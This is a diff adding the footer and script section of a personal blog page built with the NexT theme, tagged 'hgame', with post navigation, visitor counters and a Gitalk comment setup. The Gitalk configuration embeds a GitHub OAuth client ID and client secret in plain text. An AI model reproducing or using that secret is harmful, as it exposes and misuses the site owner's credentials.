+              <a href="/tags/hgame/" rel="tag"><i class="fa fa-tag"></i> hgame</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/03/16/13/" rel="prev" title="Hello World">
+                  <i class="fa fa-angle-left"></i> Hello World
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/06/01/19/" rel="next" title="d3kernel-wp">
+                  d3kernel-wp <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2023 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Mitsuha</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/mmitsuha" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"mmitsuha","repo":"mmitsuha.github.io","client_id":"Ov23liVGnPsAXo0ubWF0","client_secret":"7f77709f82466e7913658abea084b30cdc8c3bef","admin_user":"mmitsuha","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"body":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"689ab00830d7ec19898a1980f391ce0a"}</script>
+<script src="/js/third-party/comments/gitalk.js" defer></script>
+
+</body>
+</html>
